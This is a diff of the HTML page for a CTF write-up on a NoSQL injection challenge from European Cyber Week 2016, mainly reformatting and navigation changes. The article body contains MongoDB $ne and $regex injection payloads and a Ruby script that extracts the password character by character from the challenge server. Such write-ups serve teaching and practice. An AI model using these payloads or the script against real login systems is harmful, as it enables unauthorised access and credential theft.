@@ -8,7 +8,9 @@
     
         <meta name="keywords" content="security,web,writeups,ctf" />
     
-    <meta name="description" content="InformationsVersion
+    <meta name="description" content="Informations
+Version
+
 
 
 By
@@ -25,18 +27,21 @@ Creation
 
 
 CTF
+
 Name : European Cyber Week CTF Quals 2016
 Website : challenge-ecw.fr
 Type : Online
 Format : Jeopardy - Student
 
-DescriptionN.A.
-S">
+Description
+N.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ECW - 100 - Pas seulement BSON - Web">
 <meta property="og:url" content="http://rawsec.ml/en/ECW-2016-pas-seulement-BSON/index.html">
 <meta property="og:site_name" content="RawSec">
-<meta property="og:description" content="InformationsVersion
+<meta property="og:description" content="Informations
+Version
+
 
 
 By
@@ -53,18 +58,21 @@ Creation
 
 
 CTF
+
 Name : European Cyber Week CTF Quals 2016
 Website : challenge-ecw.fr
 Type : Online
 Format : Jeopardy - Student
 
-DescriptionN.A.
-S">
+Description
+N.">
 <meta property="og:image" content="http://rawsec.ml/images/ctf.png">
 <meta property="og:updated_time" content="2017-02-07T18:23:37.625Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ECW - 100 - Pas seulement BSON - Web">
-<meta name="twitter:description" content="InformationsVersion
+<meta name="twitter:description" content="Informations
+Version
+
 
 
 By
@@ -81,13 +89,14 @@ Creation
 
 
 CTF
+
 Name : European Cyber Week CTF Quals 2016
 Website : challenge-ecw.fr
 Type : Online
 Format : Jeopardy - Student
 
-DescriptionN.A.
-S">
+Description
+N.">
 <meta name="twitter:image" content="http://rawsec.ml/images/ctf.png">
     
 
@@ -247,7 +256,9 @@ ga('send', 'pageview');
         
         
         <div class="article-entry" itemprop="articleBody">
-            <h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
+            <h2>Informations</h2>
+<h3>Version</h3>
+<table>
 <thead>
 <tr>
 <th>By</th>
@@ -263,23 +274,27 @@ ga('send', 'pageview');
 </tr>
 </tbody>
 </table>
-<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
+<h3>CTF</h3>
+<ul>
 <li><strong>Name</strong> : European Cyber Week CTF Quals 2016</li>
 <li><strong>Website</strong> : <a href="https://challenge-ecw.fr/" target="_blank" rel="external">challenge-ecw.fr</a></li>
 <li><strong>Type</strong> : Online</li>
 <li><strong>Format</strong> : Jeopardy - Student</li>
 </ul>
-<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>This is a <a href="https://www.owasp.org/index.php/Testing_for_NoSQL_injection" target="_blank" rel="external">NoSQL injection</a> on the famous <a href="https://www.mongodb.com/" target="_blank" rel="external">MongoDB</a> with certain <a href="http://www.php.net/manual/en/mongo.security.php" target="_blank" rel="external">PHP</a> at backend.</p>
+<h3>Description</h3>
+<p>N.A.</p>
+<h2>Solution</h2>
+<p>This is a <a href="https://www.owasp.org/index.php/Testing_for_NoSQL_injection" target="_blank" rel="external">NoSQL injection</a> on the famous <a href="https://www.mongodb.com/" target="_blank" rel="external">MongoDB</a> with certain <a href="http://www.php.net/manual/en/mongo.security.php" target="_blank" rel="external">PHP</a> at backend.</p>
 <p>We used the <a href="queryOperator">query operators</a> to perform the NoSQLi.</p>
 <p>We tested the following payload in our script with the <a href="https://docs.mongodb.com/manual/reference/operator/query/ne/#op._S_ne" target="_blank" rel="external">ne</a> query operator to confirm presence of the vulnerability:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">password[$ne]=nosql&amp;nonce=myNonce</div></pre></td></tr></table></figure>
-<p>Then we retrieved the password letter by letter with the <a href="https://docs.mongodb.com/manual/reference/operator/query/regex/#op._S_regex" target="_blank" rel="external">regex</a> query operator of NoSQL.<br>At the beginning the script uses the following paylods:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">password[$regex]=ECW&#123;.&#123;32&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;a.&#123;31&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;b.&#123;31&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;c.&#123;31&#125;&#125;&amp;nonce=myNonce</div><div class="line">[...]</div></pre></td></tr></table></figure>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">password[$ne]=nosql&amp;nonce=myNonce</div></pre></td></tr></table></figure></p>
+<p>Then we retrieved the password letter by letter with the <a href="https://docs.mongodb.com/manual/reference/operator/query/regex/#op._S_regex" target="_blank" rel="external">regex</a> query operator of NoSQL.
+At the beginning the script uses the following paylods:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">password[$regex]=ECW&#123;.&#123;32&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;a.&#123;31&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;b.&#123;31&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;c.&#123;31&#125;&#125;&amp;nonce=myNonce</div><div class="line">[...]</div></pre></td></tr></table></figure></p>
 <p>Each bad request results in an authentification failure and when the right char is found with a succesful authentification, the script with try to find the next chars with something like:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">password[$regex]=ECW&#123;2.&#123;31&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;2a.&#123;30&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;2b.&#123;30&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;2c.&#123;30&#125;&#125;&amp;nonce=myNonce</div><div class="line">[...]</div></pre></td></tr></table></figure>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">password[$regex]=ECW&#123;2.&#123;31&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;2a.&#123;30&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;2b.&#123;30&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;2c.&#123;30&#125;&#125;&amp;nonce=myNonce</div><div class="line">[...]</div></pre></td></tr></table></figure></p>
 <p>So here is our script that we adapted from the first web challenge <em>Authentification</em>.</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'curb'</span> <span class="comment"># for get/post requests</span></div><div class="line"></div><div class="line">hostname = <span class="string">'https://challenge-ecw.fr/chals/web200'</span></div><div class="line">nonce = <span class="string">'myNonce'</span></div><div class="line"></div><div class="line">c = Curl::Easy.new(hostname) <span class="keyword">do</span> <span class="params">|curl|</span></div><div class="line">  curl.headers[<span class="string">'Cookie'</span>] = <span class="string">'session=mySessionCookie'</span></div><div class="line">  curl.headers[<span class="string">'Referer'</span>] = hostname</div><div class="line">  curl.headers[<span class="string">'Host'</span>] = <span class="string">'challenge-ecw.fr'</span></div><div class="line">  curl.headers[<span class="string">'Connection'</span>] = <span class="string">'keep-alive'</span></div><div class="line">  curl.headers[<span class="string">'Upgrade-Insecure-Requests'</span>] = <span class="string">'1'</span></div><div class="line">  <span class="comment">#curl.verbose = true</span></div><div class="line"><span class="keyword">end</span> <span class="comment"># Curl</span></div><div class="line">c.perform <span class="comment"># send the request</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> c.body_str.match(<span class="regexp">/Un nouveau m/</span>)</div><div class="line">  puts <span class="string">'• Connexion to ECW works'</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">length = <span class="number">32</span> <span class="comment"># md5(hash)</span></div><div class="line"></div><div class="line"><span class="comment"># Find each char of the password one by one</span></div><div class="line">answer = <span class="string">""</span></div><div class="line">ECW_flag_alphabet_array = (<span class="string">'a'</span>..<span class="string">'f'</span>).to_a + (<span class="number">0</span>.to_s..<span class="number">9</span>.to_s).to_a <span class="comment"># md5(hash)</span></div><div class="line">(<span class="number">1</span>..length).each <span class="keyword">do</span> <span class="params">|offset|</span></div><div class="line">  ECW_flag_alphabet_array.each <span class="keyword">do</span> <span class="params">|char|</span></div><div class="line">    c.http_post(Curl::PostField.content(<span class="string">'password[$regex]'</span>, <span class="string">"ECW&#123;<span class="subst">#&#123;answer&#125;</span><span class="subst">#&#123;char&#125;</span>.&#123;<span class="subst">#&#123;length - offset&#125;</span>&#125;&#125;"</span>),</div><div class="line">                Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">    c.perform</div><div class="line">    <span class="keyword">if</span> c.body_str.match(<span class="regexp">/Authentification valide\. Le mot de passe est le flag\./</span>)</div><div class="line">      answer.concat(char)</div><div class="line">      puts <span class="string">"Password: ECW&#123;<span class="subst">#&#123;answer&#125;</span>&#125;"</span></div><div class="line">      <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span></div><div class="line">      puts <span class="string">"Tried: ECW&#123;<span class="subst">#&#123;answer&#125;</span><span class="subst">#&#123;char&#125;</span>&#125;"</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
+<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'curb'</span> <span class="comment"># for get/post requests</span></div><div class="line"></div><div class="line">hostname = <span class="string">'https://challenge-ecw.fr/chals/web200'</span></div><div class="line">nonce = <span class="string">'myNonce'</span></div><div class="line"></div><div class="line">c = Curl::Easy.new(hostname) <span class="keyword">do</span> <span class="params">|curl|</span></div><div class="line">  curl.headers[<span class="string">'Cookie'</span>] = <span class="string">'session=mySessionCookie'</span></div><div class="line">  curl.headers[<span class="string">'Referer'</span>] = hostname</div><div class="line">  curl.headers[<span class="string">'Host'</span>] = <span class="string">'challenge-ecw.fr'</span></div><div class="line">  curl.headers[<span class="string">'Connection'</span>] = <span class="string">'keep-alive'</span></div><div class="line">  curl.headers[<span class="string">'Upgrade-Insecure-Requests'</span>] = <span class="string">'1'</span></div><div class="line">  <span class="comment">#curl.verbose = true</span></div><div class="line"><span class="keyword">end</span> <span class="comment"># Curl</span></div><div class="line">c.perform <span class="comment"># send the request</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> c.body_str.match(<span class="regexp">/Un nouveau m/</span>)</div><div class="line">  puts <span class="string">'• Connexion to ECW works'</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">length = <span class="number">32</span> <span class="comment"># md5(hash)</span></div><div class="line"></div><div class="line"><span class="comment"># Find each char of the password one by one</span></div><div class="line">answer = <span class="string">""</span></div><div class="line">ECW_flag_alphabet_array = (<span class="string">'a'</span>..<span class="string">'f'</span>).to_a + (<span class="number">0</span>.to_s..<span class="number">9</span>.to_s).to_a <span class="comment"># md5(hash)</span></div><div class="line">(<span class="number">1</span>..length).each <span class="keyword">do</span> <span class="params">|offset|</span></div><div class="line">  ECW_flag_alphabet_array.each <span class="keyword">do</span> <span class="params">|char|</span></div><div class="line">    c.http_post(Curl::PostField.content(<span class="string">'password[$regex]'</span>, <span class="string">"ECW&#123;<span class="subst">#&#123;answer&#125;</span><span class="subst">#&#123;char&#125;</span>.&#123;<span class="subst">#&#123;length - offset&#125;</span>&#125;&#125;"</span>),</div><div class="line">                Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">    c.perform</div><div class="line">    <span class="keyword">if</span> c.body_str.match(<span class="regexp">/Authentification valide\. Le mot de passe est le flag\./</span>)</div><div class="line">      answer.concat(char)</div><div class="line">      puts <span class="string">"Password: ECW&#123;<span class="subst">#&#123;answer&#125;</span>&#125;"</span></div><div class="line">      <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span></div><div class="line">      puts <span class="string">"Tried: ECW&#123;<span class="subst">#&#123;answer&#125;</span><span class="subst">#&#123;char&#125;</span>&#125;"</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
 
         </div>
         <footer class="article-footer">
@@ -287,7 +302,7 @@ ga('send', 'pageview');
 
 
 
-    <a data-url="http://rawsec.ml/en/ECW-2016-pas-seulement-BSON/" data-id="cizepeoaz00hf2rfs1pgli7bc" class="article-share-link"><i class="fa fa-share"></i>Share</a>
+    <a data-url="http://rawsec.ml/en/ECW-2016-pas-seulement-BSON/" data-id="cizoihhdx00fvmefsmt1v0c17" class="article-share-link"><i class="fa fa-share"></i>Share</a>
 <script>
     (function ($) {
         $('body').on('click', function() {
@@ -423,20 +438,20 @@ ga('send', 'pageview');
         
 <nav id="article-nav">
     
-        <a href="/en/ECW-2016-Alternative-Persistent-Threat/" id="article-nav-newer" class="article-nav-link-wrap">
+        <a href="/en/ECW-2016-dilemme/" id="article-nav-newer" class="article-nav-link-wrap">
         <strong class="article-nav-caption">newer</strong>
         <p class="article-nav-title">
         
-            ECW - 150 - Alternative Persistent Threat - Forensics
+            ECW - 150 - Dilemme - Misc
         
         </p>
         <i class="icon fa fa-chevron-right" id="icon-chevron-right"></i>
     </a>
     
     
-        <a href="/en/Hack-The-Vote-2016-50-topkek/" id="article-nav-older" class="article-nav-link-wrap">
+        <a href="/en/ECW-2016-Alternative-Persistent-Threat/" id="article-nav-older" class="article-nav-link-wrap">
         <strong class="article-nav-caption">older</strong>
-        <p class="article-nav-title">Hack The Vote 2016 - 50 - TOPKEK - Misc</p>
+        <p class="article-nav-title">ECW - 150 - Alternative Persistent Threat - Forensics</p>
         <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
         </a>
     
@@ -475,26 +490,6 @@ ga('send', 'pageview');
                     <li>
                         
                         <div class="item-thumbnail">
-                            <a href="/en/WhiteHat-Challenge-2017-20-For001-Forensics/" class="thumbnail">
-    
-    
-        <span style="background-image:url(/images/ctf.png)" alt="WhiteHat Challenge 01 - 20 - For001 - Forensics" class="thumbnail-image"></span>
-    
-    
-</a>
-
-                        </div>
-                        
-                        <div class="item-inner">
-                            <p class="item-category"><a class="article-category-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/security/writeups/">writeups</a></p>
-                            <p class="item-title"><a href="/en/WhiteHat-Challenge-2017-20-For001-Forensics/" class="title">WhiteHat Challenge 01 - 20 - For001 - Forensics</a></p>
-                            <p class="item-date"><time datetime="2017-02-26T23:00:00.000Z" itemprop="datePublished">Monday 27 February 2017 (2017-02-27)</time></p>
-                        </div>
-                    </li>
-                
-                    <li>
-                        
-                        <div class="item-thumbnail">
                             <a href="/en/NeverLAN-CTF-2017-write-ups/" class="thumbnail">
     
     
@@ -508,6 +503,26 @@ ga('send', 'pageview');
                         <div class="item-inner">
                             <p class="item-category"><a class="article-category-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/security/writeups/">writeups</a></p>
                             <p class="item-title"><a href="/en/NeverLAN-CTF-2017-write-ups/" class="title">NeverLAN CTF 2017 - Write-ups</a></p>
+                            <p class="item-date"><time datetime="2017-02-26T23:00:00.000Z" itemprop="datePublished">Monday 27 February 2017 (2017-02-27)</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/en/WhiteHat-Challenge-2017-20-For001-Forensics/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/images/ctf.png)" alt="WhiteHat Challenge 01 - 20 - For001 - Forensics" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/security/writeups/">writeups</a></p>
+                            <p class="item-title"><a href="/en/WhiteHat-Challenge-2017-20-For001-Forensics/" class="title">WhiteHat Challenge 01 - 20 - For001 - Forensics</a></p>
                             <p class="item-date"><time datetime="2017-02-26T23:00:00.000Z" itemprop="datePublished">Monday 27 February 2017 (2017-02-27)</time></p>
                         </div>
                     </li>
